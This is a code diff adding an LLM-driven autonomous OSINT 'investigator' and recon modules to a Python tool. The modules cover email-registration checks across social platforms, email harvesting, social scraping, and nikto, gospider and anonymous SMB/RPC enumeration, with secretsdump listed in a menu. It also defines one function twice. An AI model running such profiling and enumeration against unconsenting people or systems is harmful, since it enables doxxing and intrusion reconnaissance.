+                print(f"  {Y}[!] LLM response not JSON. Forcing continuation.{RS}")
+                print(f"  Raw: {response_text[:200]}")
+                continue
+
+            reasoning = decision.get("reasoning", "")
+            phase = decision.get("phase", "execute")
+
+            # PHASE 1: Plan
+            if phase == "plan":
+                self.plan = decision.get("plan", [])
+                plan_str = "\n".join(f"    {Gr}{i+1}.{Wh} {s}" for i, s in enumerate(self.plan))
+                print(f"  {C}Investigation Plan ({len(self.plan)} steps):{RS}\n{plan_str}")
+                self.phase = "execute"
+                self.history.append({"role": "assistant", "content": response_text})
+                self.history.append({"role": "user", "content": "Plan acknowledged. Start executing step 1."})
+                continue
+
+            # PHASE 2: Execute tool
+            if phase == "execute":
+                tool_name = decision.get("tool", "")
+                params = decision.get("params", {})
+
+                if reasoning:
+                    print(f"  {Y}Reasoning{Wh}: {reasoning[:250]}{RS}")
+
+                if not tool_name:
+                    if self.tools_called >= self.min_tool_calls:
+                        self.phase = "correlate"
+                        self.history.append({"role": "assistant", "content": response_text})
+                        self.history.append({"role": "user", "content": "Now perform correlation analysis on all findings."})
+                        continue
+                    else:
+                        print(f"  {R}[!] No tool specified but only {self.tools_called}/{self.min_tool_calls} tools called. Forcing continue.{RS}")
+                        continue
+
+                step = decision.get("step", self.tools_called + 1)
+                print(f"  {Gr}Step {step}{Wh} | {C}{tool_name}{Wh}({json.dumps(params)[:120]}){RS}")
+
+                tool_result = self._execute_tool(tool_name, params)
+                self.tools_called += 1
+                result_str = json.dumps(tool_result, indent=1, default=str)[:4000]
+
+                # Extract pivots
+                new_pivots = self._extract_pivots(tool_name, tool_result)
+                for p in new_pivots:
+                    if p["value"] != self.target and p["value"] not in [x["value"] for x in self.pending_pivots]:
+                        self.pending_pivots.append(p)
+
+                print(f"  {C}Result{Wh}: {result_str[:250]}{RS}")
+                if new_pivots:
+                    for p in new_pivots[:3]:
+                        print(f"    {Y}[+] New lead{Wh}: {p['type']} = {p['value']}{RS}")
+
+                key = f"{tool_name}_{self.tools_called}"
+                self.findings[key] = {"tool": tool_name, "params": params, "result": tool_result}
+
+                self.history.append({"role": "assistant", "content": response_text})
+                self.history.append({"role": "user", "content": f"Tool result:\n{result_str[:2000]}"})
+
+                # Auto-investigate pending pivots if available
+                if self.pending_pivots and self.tools_called < self.max_iterations - 3:
+                    pivot = self.pending_pivots.pop(0)
+                    if pivot["type"] == "ip" and self.tools_called < self.min_tool_calls + 3:
+                        print(f"  {Y}[→] Auto-pivot: investigating {pivot['type']} {pivot['value']}{RS}")
+                        self.history.append({"role": "user", "content": f"New lead discovered: {pivot['type']} = {pivot['value']}. Investigate it."})
+                    elif pivot["type"] == "domain":
+                        print(f"  {Y}[→] Auto-pivot: investigating domain {pivot['value']}{RS}")
+                        self.history.append({"role": "user", "content": f"New domain found: {pivot['value']}. Run domain investigation."})
+                    elif pivot["type"] == "email":
+                        print(f"  {Y}[→] Auto-pivot: investigating email {pivot['value']}{RS}")
+                        self.history.append({"role": "user", "content": f"New email found: {pivot['value']}. Check platforms and breaches."})
+                    elif pivot["type"] == "username":
+                        print(f"  {Y}[→] Auto-pivot: investigating username {pivot['value']}{RS}")
+                        self.history.append({"role": "user", "content": f"New username found: {pivot['value']}. Track it."})
+
+                continue
+
+            # PHASE 3: Correlate
+            if phase == "correlate":
+                self.correlated = True
+                connections = decision.get("connections_found", [])
+                risk = decision.get("risk_score", 50)
+                print(f"  {P}Correlation Analysis:{RS}")
+                for c in connections[:5]:
+                    print(f"    → {c}")
+                if risk:
+                    risk_color = R if risk > 60 else Y if risk > 30 else Gr
+                    print(f"  {Gr}Risk Score{Wh}: {risk_color}{risk}/100{RS}")
+                self.phase = "final"
+                self.history.append({"role": "assistant", "content": response_text})
+                self.history.append({"role": "user", "content": "Now provide the final investigation report."})
+                continue
+
+            # PHASE 4: Final
+            if phase == "final":
+                print(f"\n{Gr}▶ Investigation complete!{RS}")
+                decision.setdefault("tools_used", list(set(v["tool"] for v in self.findings.values())))
+                decision.setdefault("total_tools_called", self.tools_called)
+                decision.setdefault("new_leads", [f"{p['type']}: {p['value']}" for p in self.pending_pivots])
+                return decision
+
+            # Fallback: unknown phase
+            print(f"  {Y}[!] Unknown phase '{phase}', continuing{RS}")
+            self.history.append({"role": "assistant", "content": response_text})
+
+        print(f"\n{Y}[!] Max iterations ({self.max_iterations}) reached{RS}")
+        summary_parts = [f"{k}: {json.dumps(v.get('result',{}), default=str)[:100]}" for k, v in self.findings.items()]
+        return {"phase": "final", "target": self.target, "summary": f"Investigation exhausted after {self.iteration} iterations",
+                "tools_used": list(set(v["tool"] for v in self.findings.values())), "total_tools_called": self.tools_called,
+                "key_findings": summary_parts[:10], "risk_score": 50, "connections_discovered": [],
+                "new_leads": [], "recommendations": ["Increase max_iterations or try targeted approach"]}
+
+
+def ai_agent_engine():
+    clear()
+    print(f"\n{R}╔══ AI Autonomous Investigator v2 ══╗{Wh}")
+    print(f"{R}║{Wh}  Multi-Step Deep OSINT Investigation     {R}║{Wh}")
+    print(f"{R}║{Wh}  Plan → Execute (6+ tools) → Correlate  {R}║{Wh}")
+    print(f"{R}╚═══════════════════════════════════════════╝{RS}\n")
+
+    if Groq is None:
+        print(f"{R}[!] Groq not installed. Run: pip install groq{Wh}")
+        input(f"\n{Wh}[+] Press Enter")
+        return
+
+    api_key = os.environ.get("GROQ_API_KEY")
+    if not api_key:
+        print(f"{Y}[!] GROQ_API_KEY not set{Wh}")
+        key = input(f"{Wh}[+] Enter your Groq API key: {Gr}").strip()
+        if not key:
+            return
+        os.environ["GROQ_API_KEY"] = key
+        api_key = key
+
+    target = input(f"\n{Wh}[+] Target {Gr}[email, username, domain, IP, phone]{Wh}: {Gr}").strip()
+    if not target:
+        return
+    target = target.lower().replace('https://', '').replace('http://', '').split('/')[0].split('?')[0]
+
+    agent = AIAgent(api_key, target)
+    result = agent.run()
+
+    print(f"\n {'='*60}")
+    print(f" {R}╔══ FINAL INVESTIGATION REPORT ══╗")
+    print(f" {'='*60}{RS}")
+    print(f"{Wh} Target          : {C}{target}")
+    print(f"{Wh} Type            : {C}{agent.target_type}")
+    print(f"{Wh} Tools Called    : {Gr}{agent.tools_called} / {agent.min_tool_calls}+ required")
+    print(f"{Wh} Iterations      : {Gr}{agent.iteration}{Wh}")
+
+    summary = result.get("summary", "")
+    if summary:
+        print(f"\n{Gr} Summary{Wh}: {summary[:500]}{Wh}")
+
+    tools_used = result.get("tools_used", [])
+    if tools_used:
+        print(f"\n{Gr} Tools Used ({len(tools_used)}):{Wh}")
+        for t in tools_used:
+            print(f"  • {t}")
+
+    findings = result.get("key_findings", [])
+    if findings:
+        print(f"\n{Gr} Key Findings:{Wh}")
+        for f in findings:
+            print(f"  • {str(f)[:200]}")
+
+    risk = result.get("risk_score")
+    if risk is not None:
+        risk_color = R if risk > 60 else Y if risk > 30 else Gr
+        print(f"\n{Gr} Risk Score     : {risk_color}{risk}/100{Wh}")
+
+    connections = result.get("connections_discovered", [])
+    if connections:
+        print(f"\n{Gr} Connections:{Wh}")
+        for c in connections:
+            print(f"  → {c}")
+
+    leads = result.get("new_leads", [])
+    if leads:
+        print(f"\n{C} New Leads for Further Investigation:{Wh}")
+        for l in leads:
+            print(f"  ◆ {l}")
+
+    recs = result.get("recommendations", [])
+    if recs:
+        print(f"\n{Gr} Recommendations:{Wh}")
+        for r in recs:
+            print(f"  • {r}")
+
+    print(f"\n{'='*60}")
+    print(f"{Gr} RAW FINDINGS:{Wh}")
+    for key, data in agent.findings.items():
+        tool_name = data.get("tool", key)
+        res_preview = json.dumps(data.get("result", {}), default=str)[:150]
+        print(f"  {C}{key}{Wh}: [{tool_name}] {res_preview}")
+
+    report_data = {
+        "target": target, "type": agent.target_type, "iterations": agent.iteration,
+        "tools_called": agent.tools_called, "final_analysis": result,
+        "raw_findings": {k: {"tool": v["tool"], "result": v["result"]} for k, v in agent.findings.items()}
+    }
+    result_obj = ScanResult(
+        timestamp=datetime.now().isoformat(), scan_type="ai_agent_v2",
+        target=target, data=report_data
+    )
+    save_report(result_obj)
+    input(f"\n{Wh}[+] Press Enter")
+
+
+def ai_agent_engine():
+    clear()
+    print(f"\n{R}╔══ AI Autonomous Investigator ══╗{Wh}")
+    print(f"{R}║{Wh}  Unified AI Agent — Uses ALL Tool Features   {R}║{Wh}")
+    print(f"{R}║{Wh}  Autonomous multi-tool OSINT orchestration    {R}║{Wh}")
+    print(f"{R}╚══════════════════════════════════════════════╝{RS}\n")
+
+    if Groq is None:
+        print(f"{R}[!] Groq not installed. Run: pip install groq{Wh}")
+        input(f"\n{Wh}[+] Press Enter")
+        return
+
+    api_key = os.environ.get("GROQ_API_KEY")
+    if not api_key:
+        print(f"{Y}[!] GROQ_API_KEY not set{Wh}")
+        key = input(f"{Wh}[+] Enter your Groq API key: {Gr}").strip()
+        if not key:
+            return
+        os.environ["GROQ_API_KEY"] = key
+        api_key = key
+
+    target = input(f"\n{Wh}[+] Target {Gr}[email, username, domain, IP, phone]{Wh}: {Gr}").strip()
+    if not target:
+        return
+
+    target = target.lower().replace('https://', '').replace('http://', '').split('/')[0].split('?')[0]
+
+    agent = AIAgent(api_key, target)
+    result = agent.run()
+
+    print(f"\n {'='*55}")
+    print(f" {R} FINAL INVESTIGATION REPORT")
+    print(f" {'='*55}")
+    print(f"{Wh} Target       : {C}{target}")
+    print(f"{Wh} Type         : {C}{agent.target_type}")
+    print(f"{Wh} Iterations   : {Gr}{agent.iteration}")
+    print(f"{Wh} Tools Called : {Gr}{len(agent.findings)}{Wh}")
+
+    summary = result.get("summary", "")
+    if summary:
+        print(f"\n{Gr} Summary{Wh}: {summary}")
+
+    key_findings = result.get("key_findings", [])
+    if key_findings:
+        print(f"\n{Gr} Key Findings:{Wh}")
+        for f in key_findings:
+            print(f"  • {f}")
+
+    risk = result.get("risk_score")
+    if risk is not None:
+        risk_color = R if risk > 60 else Y if risk > 30 else Gr
+        print(f"\n{Gr} Risk Score   : {risk_color}{risk}/100{Wh}")
+
+    connections = result.get("connections", [])
+    if connections:
+        print(f"\n{Gr} Connections Found:{Wh}")
+        for c in connections:
+            print(f"  → {c}")
+
+    recommendations = result.get("recommendations", [])
+    if recommendations:
+        print(f"\n{Gr} Recommendations:{Wh}")
+        for r in recommendations:
+            print(f"  • {r}")
+
+    print(f"\n{'='*55}")
+    print(f"{Gr} All Findings (raw){Wh}:")
+    for key, data in agent.findings.items():
+        print(f"  {C}{key}{Wh}: {json.dumps(data, default=str)[:300]}")
+
+    report_data = {
+        "target": target,
+        "type": agent.target_type,
+        "iterations": agent.iteration,
+        "tools_called": len(agent.findings),
+        "final_analysis": result,
+        "raw_findings": {k: v for k, v in agent.findings.items()}
+    }
+    result_obj = ScanResult(
+        timestamp=datetime.now().isoformat(),
+        scan_type="ai_agent",
+        target=target,
+        data=report_data
+    )
+    save_report(result_obj)
+
+    input(f"\n{Wh}[+] Press Enter")
+
+
+# ── Advanced Security & OSINT Modules ───────────────────────────────
+
+def check_email_platforms(email: str) -> Dict:
+    """حساب Holehe: التحقق من وجود البريد على المنصات"""
+    result = {"email": email, "registered_on": [], "not_registered": [], "errors": []}
+    domain = email.split("@")[1] if "@" in email else ""
+    session = get_session()
+
+    checks = [
+        {"name": "Twitter", "url": "https://x.com/users/forgot_password", "data": {"email": email},
+         "type": "post", "indicator": "email_not_found"},
+        {"name": "Instagram", "url": "https://www.instagram.com/accounts/web_create_ajax/",
+         "type": "post", "data": {"email": email}, "indicator": "email_is_taken"},
+        {"name": "Adobe", "url": "https://auth.services.adobe.com/signup/v2/users/email", "type": "post",
+         "data": {"email": email, "serviceName": "adobeid"}, "indicator": "already_have_account"},
+        {"name": "Pinterest", "url": "https://www.pinterest.com/resource/EmailExistsResource/get/",
+         "type": "get", "params": {"email": email}, "indicator": "true"},
+        {"name": "Snapchat", "url": "https://accounts.snapchat.com/accounts/merlin/login",
+         "type": "post", "data": {"email": email}, "indicator": "error"},
+        {"name": "Spotify", "url": "https://www.spotify.com/api/signup/validate",
+         "type": "post", "data": {"validate": "email", "email": email}, "indicator": "already_used"},
+        {"name": "WordPress.com", "url": "https://public-api.wordpress.com/rest/v1.1/users/email/exists",
+         "type": "post", "data": {"email": email}, "indicator": "true"},
+        {"name": "Tumblr", "url": "https://www.tumblr.com/svc/account/register_email_check",
+         "type": "post", "data": {"email": email}, "indicator": "taken"},
+        {"name": "Patreon", "url": "https://www.patreon.com/api/auth/check_email", "type": "post",
+         "data": {"data": {"attributes": {"email": email}}}, "indicator": "taken"},
+        {"name": "Dribbble", "url": "https://dribbble.com/api/v3/users/check?email=" + requests.utils.quote(email),
+         "type": "get", "indicator": "taken"},
+        {"name": "GitLab", "url": "https://gitlab.com/users/sign_in", "type": "get_check",
+         "check_url": f"https://gitlab.com/api/v4/users?search={email.split('@')[0]}", "indicator": "email"},
+    ]
+
+    for check in checks:
+        try:
+            if check["type"] == "post":
+                resp = session.post(check["url"], json=check.get("data", {}), timeout=6,
+                                    headers={"User-Agent": random.choice(CONFIG["user_agents"])},
+                                    allow_redirects=False)
+                body = resp.text.lower()
+                indicator = check.get("indicator", "")
+                if indicator and indicator in body:
+                    result["registered_on"].append(check["name"])
+                elif resp.status_code == 200:
+                    try:
+                        j = resp.json()
+                        if isinstance(j, dict) and any(indicator in str(v).lower() for v in j.values()):
+                            result["registered_on"].append(check["name"])
+                    except:
+                        pass
+            elif check["type"] == "get":
+                resp = session.get(check["url"], params=check.get("params", {}), timeout=6,
+                                   headers={"User-Agent": random.choice(CONFIG["user_agents"])})
+                body = resp.text.lower()
+                if check.get("indicator", "") in body:
+                    result["registered_on"].append(check["name"])
+            elif check["type"] == "get_check":
+                resp = session.get(check["check_url"], timeout=6,
+                                   headers={"User-Agent": random.choice(CONFIG["user_agents"])})
+                if check.get("indicator", "") in resp.text.lower():
+                    result["registered_on"].append(check["name"])
+        except Exception as e:
+            result["errors"].append(f"{check['name']}: {str(e)[:30]}")
+
+    result["registered_count"] = len(result["registered_on"])
+    return result
+
+
+def harvester_search(query: str, sources: str = "all") -> Dict:
+    """theHarvester: جمع الإيميلات والنطاقات من محركات البحث"""
+    result = {"query": query, "emails": [], "hosts": [], "subdomains": [], "ips": []}
+    session = get_session()
+
+    if sources in ("all", "google"):
+        try:
+            resp = session.get(
+                f"https://www.google.com/search?q=%40{query.split('@')[0] if '@' in query else query}+email",
+                timeout=8, headers={"User-Agent": random.choice(CONFIG["user_agents"])}
+            )
+            emails = set(re.findall(r'[\w.+-]+@[\w-]+\.[\w.-]+', resp.text))
+            result["emails"] = list(emails)[:30]
+        except:
+            pass
+
+    if sources in ("all", "bing"):
+        try:
+            resp = session.get(
+                f"https://www.bing.com/search?q=site%3A{query}+email",
+                timeout=8, headers={"User-Agent": random.choice(CONFIG["user_agents"])}
+            )
+            found = set(re.findall(r'[\w.+-]+@[\w-]+\.[\w.-]+', resp.text))
+            result["emails"] = list(set(result["emails"] + list(found)))[:30]
+        except:
+            pass
+
+    if sources in ("all", "crt"):
+        try:
+            import dns.resolver
+            subs = get_subdomains_crt(query)
+            result["subdomains"] = subs[:30]
+            for sub in subs[:10]:
+                try:
+                    ips = dns.resolver.resolve(sub, 'A')
+                    for ip in ips:
+                        result["ips"].append(str(ip))
+                except:
+                    pass
+        except:
+            pass
+
+    if sources in ("all", "dns"):
+        try:
+            engine = DnsReconEngine(query)
+            subs = engine.brute_subdomains(threads=10)
+            for sub, ips in subs:
+                result["hosts"].append(f"{sub}.{query}")
+                result["ips"].extend(ips)
+        except:
+            pass
+
+    result["total"] = len(result["emails"]) + len(result["subdomains"]) + len(result["ips"])
+    return result
+
+
+def social_scraper(platform: str, query: str, limit: int = 50) -> Dict:
+    """snscrape: سحب منشورات من تويتر/ريديت بدون API"""
+    result = {"platform": platform, "query": query, "posts": [], "error": None}
+
+    try:
+        import snscrape.modules.twitter as sntwitter
+        tweets = []
+        for i, tweet in enumerate(sntwitter.TwitterSearchScraper(query).get_items()):
+            if i >= limit:
+                break
+            tweets.append({
+                "date": str(tweet.date),
+                "user": tweet.user.username,
+                "content": tweet.content[:500],
+                "url": tweet.url,
+                "retweets": tweet.retweetCount,
+                "likes": tweet.likeCount,
+                "replies": tweet.replyCount
+            })
+        if tweets:
+            result["posts"] = tweets
+            result["count"] = len(tweets)
+            return result
+    except ImportError:
+        result["error"] = "snscrape not installed (pip install snscrape)"
+    except Exception as e:
+        result["error"] = str(e)[:100]
+
+    try:
+        import snscrape.modules.reddit as snreddit
+        posts = []
+        for i, post in enumerate(snreddit.RedditSearchScraper(query).get_items()):
+            if i >= limit:
+                break
+            posts.append({
+                "date": str(post.date),
+                "title": post.title[:200] if hasattr(post, 'title') else "",
+                "content": post.selftext[:500] if hasattr(post, 'selftext') else (post.body[:500] if hasattr(post, 'body') else ""),
+                "url": post.url,
+                "score": post.score if hasattr(post, 'score') else 0
+            })
+        if posts:
+            result["posts"] = posts
+            result["count"] = len(posts)
+            return result
+    except ImportError:
+        pass
+    except Exception as e:
+        result["error"] = str(e)[:100]
+
+    return result
+
+
+def nikto_scan(target: str) -> Dict:
+    """nikto: فحص خادم الويب للبحث عن ملفات خطيرة"""
+    result = {"target": target, "vulnerabilities": [], "raw": ""}
+    result["note"] = "Install nikto: apt install nikto (Linux/WSL)"
+    try:
+        import subprocess
+        cmd = ["nikto", "-h", target, "-ssl", "-Format", "json", "-nointeractive"]
+        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
+        if proc.returncode == 0 or proc.stdout:
+            result["raw"] = proc.stdout[:2000]
+            try:
+                nikto_json = json.loads(proc.stdout)
+                if isinstance(nikto_json, list):
+                    result["vulnerabilities"] = nikto_json
+                elif isinstance(nikto_json, dict):
+                    result["vulnerabilities"] = nikto_json.get("vulnerabilities", [])
+            except:
+                lines = [l for l in proc.stdout.split('\n') if '+' in l or '!' in l]
+                result["vulnerabilities"] = lines[:30]
+        elif proc.stderr:
+            result["error"] = proc.stderr[:200]
+    except FileNotFoundError:
+        result["error"] = "nikto not found"
+    except subprocess.TimeoutExpired:
+        result["error"] = "Scan timed out"
+    except Exception as e:
+        result["error"] = str(e)[:100]
+    return result
+
+
+def whatweb_detect(target: str) -> Dict:
+    """whatweb: كشف تقنيات الموقع بدقة"""
+    result = {"target": target, "plugins": [], "raw": ""}
+    result["note"] = "Install whatweb: apt install whatweb (Linux/WSL)"
+    try:
+        import subprocess
+        cmd = ["whatweb", "-a", "3", "--no-errors", "-q", target]
+        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+        if proc.stdout:
+            result["raw"] = proc.stdout.strip()[:2000]
+            parts = proc.stdout.strip().split(',')
+            for p in parts[1:]:
+                p = p.strip()
+                if '[' in p:
+                    name = p.split('[')[0].strip()
+                    details = p.split('[')[1].rstrip(']')
+                    if name:
+                        result["plugins"].append({"name": name, "details": details})
+                elif p:
+                    result["plugins"].append({"name": p, "details": ""})
+        if proc.stderr and not result["plugins"]:
+            result["error"] = proc.stderr[:200]
+    except FileNotFoundError:
+        result["error"] = "whatweb not found"
+    except subprocess.TimeoutExpired:
+        result["error"] = "Scan timed out"
+    except Exception as e:
+        result["error"] = str(e)[:100]
+    return result
+
+
+def gospider_crawl(target: str, depth: int = 2, concurrency: int = 3) -> Dict:
+    """gospider: زحف عميق للمواقع مع اكتشاف JS"""
+    result = {"target": target, "urls": [], "forms": [], "js_files": [], "subdomains": []}
+    result["note"] = "Install gospider: go install github.com/jaeles-project/gospider@latest"
+    try:
+        import subprocess
+        cmd = ["gospider", "-s", target, "-d", str(depth), "-c", str(concurrency),
+               "-t", "2", "--js", "--sitemap", "--robots", "-o", "."]
+        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
+        output = proc.stdout + proc.stderr
+        result["raw"] = output[:2000]
+        urls = set(re.findall(r'https?://[^\s"\'<>]+', output))
+        result["urls"] = sorted(urls)[:50]
+        result["forms"] = re.findall(r'\[form\]\s*(.*)', output)[:20]
+        result["js_files"] = re.findall(r'\[javascript\]\s*(.*)', output)[:20]
+        result["subdomains"] = re.findall(r'\[subdomain\]\s*(.*)', output)[:20]
+    except FileNotFoundError:
+        result["error"] = "gospider not found"
+    except subprocess.TimeoutExpired:
+        result["error"] = "Crawl timed out"
+    except Exception as e:
+        result["error"] = str(e)[:100]
+    return result
+
+
+def impacket_enum(target: str, protocol: str = "smb") -> Dict:
+    """impacket: تعداد بروتوكولات ويندوز"""
+    result = {"target": target, "protocol": protocol, "findings": []}
+    result["note"] = "Install impacket: pip install impacket"
+    try:
+        import subprocess
+        if protocol == "smb":
+            cmd = ["smbclient", "-L", target, "-N"]
+        elif protocol == "rpc":
+            cmd = ["rpcclient", "-U", "", "-N", target]
+        elif protocol == "enum4linux":
+            cmd = ["enum4linux", "-a", target]
+        elif protocol == "samrdump":
+            cmd = ["samrdump.py", target]
+        else:
+            cmd = ["impacket-" + protocol, target]
+        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+        if proc.stdout:
+            result["findings"] = proc.stdout.split('\n')[:50]
+            result["raw"] = proc.stdout[:2000]
+        if proc.stderr:
+            result["stderr"] = proc.stderr[:500]
+    except FileNotFoundError:
+        pass
+    except Exception as e:
+        result["error"] = str(e)[:100]
+    return result
+
+
+def advanced_tools_menu():
+    clear()
+    print(f"\n{R}╔══ Advanced Security & OSINT Modules ══╗{Wh}")
+    print(f"{R}║{Wh}  holehe · theHarvester · snscrape · nikto  {R}║{Wh}")
+    print(f"{R}║{Wh}  whatweb · gospider · impacket            {R}║{Wh}")
+    print(f"{R}╚═══════════════════════════════════════════════╝{RS}")
+
+    while True:
+        print(f"\n{R}┌── Advanced Modules ──┐{Wh}")
+        print(f"  {Gr}[1]{Wh}  Holehe — Email Platform Checker{R}  🆕{Wh}")
+        print(f"  {Gr}[2]{Wh}  theHarvester — Search Engine OSINT")
+        print(f"  {Gr}[3]{Wh}  snscrape — Social Media Scraper")
+        print(f"  {Gr}[4]{Wh}  nikto — Web Vulnerability Scanner")
+        print(f"  {Gr}[5]{Wh}  whatweb — Enhanced Tech Detection")
+        print(f"  {Gr}[6]{Wh}  gospider — Deep JS Crawler")
+        print(f"  {Gr}[7]{Wh}  impacket — Windows Protocol Enum")
+        print(f"  {Gr}[0]{Wh}  Back")
+        print(f"{R}└{'─'*25}┘{RS}")
+
+        choice = input(f"\n{Wh}[{R}?{Wh}] {R}Select{Wh}: {Gr}").strip()
+
+        if choice == '0':
+            break
+
+        elif choice == '1':
+            clear()
+            print(f"\n{C}══ Holehe — Email Platform Checker ══{RS}\n")
+            email = input(f"{Wh}[+] Email: {Gr}").strip()
+            if not email or '@' not in email:
+                print(f"{R}[!] Valid email required{RS}")
+                input(f"\n[+] Press Enter")
+                continue
+            print(f"{Y}[*] Checking {email} across platforms...{RS}")
+            result = check_email_platforms(email)
+            print(f"\n{Gr} Registered on:{Wh}")
+            for p in result.get("registered_on", []):
+                print(f"  ✓ {C}{p}{Wh}")
+            print(f"\n{Y} Total: {len(result.get('registered_on', []))} platforms{RS}")
+            if result.get("errors"):
+                print(f"\n{R} Errors:{Wh}")
+                for e in result["errors"]:
+                    print(f"  ✗ {e}")
+            input(f"\n[+] Press Enter")
+
+        elif choice == '2':
+            clear()
+            print(f"\n{C}══ theHarvester — Search Engine OSINT ══{RS}\n")
+            query = input(f"{Wh}[+] Domain/Query: {Gr}").strip()
+            if not query:
+                continue
+            src = input(f"{Wh}[+] Sources {Gr}[all/google/bing/crt/dns]{Wh}: {Gr}").strip() or "all"
+            print(f"{Y}[*] Harvesting from {src}...{RS}")
+            result = harvester_search(query, src)
+            print(f"\n{Gr} Emails ({len(result.get('emails', []))}):{Wh}")
+            for e in result.get("emails", [])[:10]:
+                print(f"  {C}{e}{Wh}")
+            print(f"\n{Gr} Subdomains ({len(result.get('subdomains', []))}):{Wh}")
+            for s in result.get("subdomains", [])[:10]:
+                print(f"  {C}{s}{Wh}")
+            print(f"\n{Gr} IPs ({len(result.get('ips', []))}):{Wh}")
+            for ip in result.get("ips", [])[:10]:
+                print(f"  {C}{ip}{Wh}")
+            input(f"\n[+] Press Enter")
+
+        elif choice == '3':
+            clear()
+            print(f"\n{C}══ snscrape — Social Media Scraper ══{RS}\n")
+            print(f"{Wh} Platforms: twitter, reddit{Wh}")
+            platform = input(f"{Wh}[+] Platform: {Gr}").strip().lower()
+            query = input(f"{Wh}[+] Search query: {Gr}").strip()
+            lim = input(f"{Wh}[+] Limit {Gr}[50]{Wh}: {Gr}").strip()
+            limit = int(lim) if lim.isdigit() else 50
+            if not platform or not query:
+                continue
+            print(f"{Y}[*] Scraping {platform} for '{query}'...{RS}")
+            result = social_scraper(platform, query, limit)
+            if result.get("error"):
+                print(f"{R}[!] {result['error']}{RS}")
+            elif result.get("posts"):
+                print(f"\n{Gr} Found {result['count']} posts:{Wh}")
+                for post in result["posts"][:10]:
+                    print(f"  {C}{post.get('date','')[:10]}{Wh} | {post.get('user','')[:20]:20} | {post.get('content','')[:100]}")
+            else:
+                print(f"{Y}[-] No results{RS}")
+            input(f"\n[+] Press Enter")
+
+        elif choice == '4':
+            clear()
+            print(f"\n{C}══ nikto — Web Vulnerability Scanner ══{RS}\n")
+            target = input(f"{Wh}[+] Target URL/IP: {Gr}").strip()
+            if not target:
+                continue
+            print(f"{Y}[*] Running nikto scan on {target}...{RS}")
+            result = nikto_scan(target)
+            if result.get("error"):
+                print(f"{R}  {result['error']}{RS}")
+            if result.get("note"):
+                print(f"{Y}  {result['note']}{RS}")
+            if result.get("vulnerabilities"):
+                print(f"\n{Gr} Findings:{Wh}")
+                for vuln in result["vulnerabilities"][:20]:
+                    print(f"  ! {C}{vuln if isinstance(vuln, str) else json.dumps(vuln)[:200]}{Wh}")
+            if result.get("raw"):
+                print(f"\n{Y} Raw output:{Wh}\n{result['raw'][:1000]}")
+            input(f"\n[+] Press Enter")
+
+        elif choice == '5':
+            clear()
+            print(f"\n{C}══ whatweb — Enhanced Tech Detection ══{RS}\n")
+            target = input(f"{Wh}[+] Target URL: {Gr}").strip()
+            if not target:
+                continue
+            print(f"{Y}[*] Running whatweb...{RS}")
+            result = whatweb_detect(target)
+            if result.get("error"):
+                print(f"{R}  {result['error']}{RS}")
+            if result.get("note"):
+                print(f"{Y}  {result['note']}{RS}")
+            if result.get("plugins"):
+                print(f"\n{Gr} Detected ({len(result['plugins'])}):{Wh}")
+                for p in result["plugins"]:
+                    name = p.get("name", "")
+                    details = p.get("details", "")
+                    print(f"  {C}{name:25}{Wh} {details[:80]}")
+            if result.get("raw"):
+                print(f"\n{Y} Raw:{Wh} {result['raw'][:500]}")
+            input(f"\n[+] Press Enter")
+
+        elif choice == '6':
+            clear()
+            print(f"\n{C}══ gospider — Deep JS Crawler ══{RS}\n")
+            target = input(f"{Wh}[+] Target URL: {Gr}").strip()
+            if not target:
+                continue
+            depth = input(f"{Wh}[+] Depth {Gr}[2]{Wh}: {Gr}").strip()
+            depth = int(depth) if depth.isdigit() else 2
+            print(f"{Y}[*] Crawling {target}...{RS}")
+            result = gospider_crawl(target, depth)
+            if result.get("error"):
+                print(f"{R}  {result['error']}{RS}")
+            if result.get("note"):
+                print(f"{Y}  {result['note']}{RS}")
+            if result.get("urls"):
+                print(f"\n{Gr} URLs ({len(result['urls'])}):{Wh}")
+                for u in result["urls"][:15]:
+                    print(f"  {C}{u[:120]}{Wh}")
+            if result.get("forms"):
+                print(f"\n{Gr} Forms ({len(result['forms'])}):{Wh}")
+                for f in result["forms"][:10]:
+                    print(f"  {C}{f[:120]}{Wh}")
+            if result.get("js_files"):
+                print(f"\n{Gr} JS Files ({len(result['js_files'])}):{Wh}")
+                for j in result["js_files"][:10]:
+                    print(f"  {C}{j[:120]}{Wh}")
+            if result.get("subdomains"):
+                print(f"\n{Gr} Subdomains ({len(result['subdomains'])}):{Wh}")
+                for s in result["subdomains"][:10]:
+                    print(f"  {C}{s}{Wh}")
+            input(f"\n[+] Press Enter")
+
+        elif choice == '7':
+            clear()
+            print(f"\n{C}══ impacket — Windows Protocol Enum ══{RS}\n")
+            print(f"{Wh} Protocols: smb, rpc, enum4linux, samrdump, secretsdump{Wh}")
+            target = input(f"{Wh}[+] Target IP: {Gr}").strip()
+            if not target:
+                continue
+            protocol = input(f"{Wh}[+] Protocol {Gr}[smb]{Wh}: {Gr}").strip() or "smb"
+            print(f"{Y}[*] Enumerating {protocol} on {target}...{RS}")
+            result = impacket_enum(target, protocol)
+            if result.get("error"):
+                print(f"{R}  {result['error']}{RS}")
+            if result.get("note"):
+                print(f"{Y}  {result['note']}{RS}")
+            if result.get("findings"):
+                print(f"\n{Gr} Findings:{Wh}")
+                for line in result["findings"][:20]:
+                    print(f"  {line[:150]}")
+            if result.get("stderr"):
+                print(f"\n{Y} stderr:{Wh} {result['stderr'][:300]}")
+            input(f"\n[+] Press Enter")
+
+        else:
+            print(f"{R}[!] Invalid option{RS}")
+            time.sleep(1)
 
 
 def create_investigation_graph(data: Dict, output_file: str = "investigation_graph.html") -> str:
@@ -5024,7 +8660,7 @@ def create_investigation_graph(data: Dict, output_file: str = "investigation_gra
 
 def visualization_menu():
     print(f"\n {Wh}{'='*50}")
-    print(f" {R}📊 INVESTIGATION GRAPH")
+    print(f" {R} INVESTIGATION GRAPH")
     print(f" {Wh}{'='*50}")
 
     report_files = list(Path(CONFIG["output_dir"]).glob("agentic_ai_*.json"))
@@ -5203,7 +8839,7 @@ def analyze_profile_images_osint(username: str) -> Dict:
 
 def age_gender_menu():
     print(f"\n {Wh}{'='*50}")
-    print(f" {R}🧑 AGE & GENDER DETECTION")
+    print(f" {R} AGE & GENDER DETECTION")
     print(f" {Wh}{'='*50}")
 
